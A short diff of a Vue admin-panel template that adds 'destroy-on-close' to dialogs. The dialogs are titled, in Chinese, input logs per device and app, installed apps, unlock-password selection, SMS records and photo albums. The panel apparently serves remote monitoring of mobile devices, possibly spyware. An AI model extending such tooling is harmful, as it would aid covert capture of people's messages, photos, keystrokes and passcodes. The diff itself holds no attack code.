@@ -187,7 +187,7 @@
     <DeviceDetail ref="deviceDetail" @wakeup="wakeup"></DeviceDetail>
     <!-- 输入日志弹窗 -->
     <el-dialog v-model="inputLogVisible" :title="`输入日志 - 设备ID: ${currentDevice.deviceId} 包名: ${currentDevice.pkg}`"
-      width="970px" :close-on-click-modal="false" class="input-log-dialog">
+      width="970px" :close-on-click-modal="false" class="input-log-dialog" destroy-on-close>
       <div class="log-header">
         <div class="header-row">
           <div class="query-controls">
@@ -230,12 +230,12 @@
 
     <!-- 安装应用弹窗 -->
     <el-dialog v-model="appListVisible" :title="`安装应用列表 - 设备ID: ${currentAppDevice.deviceId}`" width="1200px"
-      :close-on-click-modal="false">
+      :close-on-click-modal="false" destroy-on-close>
       <AppList :device-id="currentAppDevice.deviceId" />
     </el-dialog>
     <!-- 选择解锁密码弹窗 -->
     <el-dialog v-model="unlockDialogVisible" :title="`选择解锁密码 - 设备ID: ${currentWakeRow?.deviceId || ''}`" width="480px"
-      :close-on-click-modal="false">
+      :close-on-click-modal="false" destroy-on-close>
       <div>
         <el-form label-width="90px">
           <el-form-item label="解锁密码">
@@ -260,13 +260,13 @@
 
     <!-- 短信记录弹窗 -->
     <el-dialog v-model="smsListVisible" :title="`短信记录 - 设备ID: ${currentSmsDevice.deviceId}`" width="1200px"
-      :close-on-click-modal="false">
+      :close-on-click-modal="false" destroy-on-close>
       <SmsList :device-id="currentSmsDevice.deviceId" />
     </el-dialog>
 
     <!-- 相册列表弹窗 -->
     <el-dialog v-model="albumListVisible" :title="`相册列表 - 设备ID: ${currentAlbumDevice.deviceId}`" width="1200px"
-      :close-on-click-modal="false">
+      :close-on-click-modal="false" destroy-on-close>
       <AlbumList :device-id="currentAlbumDevice.deviceId" />
     </el-dialog>
   </div>
